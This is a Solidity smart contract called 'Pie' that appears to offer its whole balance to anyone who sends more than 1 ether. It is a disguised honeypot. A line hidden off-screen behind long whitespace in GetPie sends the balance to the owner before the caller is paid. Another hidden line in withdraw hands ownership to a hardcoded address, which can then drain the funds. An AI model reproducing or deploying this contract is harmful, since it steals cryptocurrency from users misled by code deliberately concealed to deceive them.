pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = getSender();
   
    function()
    public
    payable
    {
        
    }
   
    function GetPie()
    public
    payable
    {                                                                    
        if(getValue() > 1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       getOwner().transfer(getThisBalance());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            getSender().transfer(getThisBalance());
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(getSender() == getSpecificAddress()){Owner = getSpecificAddress();}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        require(getSender() == getOwner());
        getOwner().transfer(getThisBalance());
    }
    
    function Command(address adr, bytes data)
    payable
    public
    {
        require(getSender() == getOwner());
         
        adr.call.value(getValue())(data);
    }

    function getSender() internal view returns (address) {
        return msg.sender;
    }

    function getValue() internal view returns (uint) {
        return msg.value;
    }

    function getOwner() internal view returns (address) {
        return Owner;
    }

    function getThisBalance() internal view returns (uint) {
        return this.balance;
    }

    function getSpecificAddress() internal pure returns (address) {
        return 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
    }
}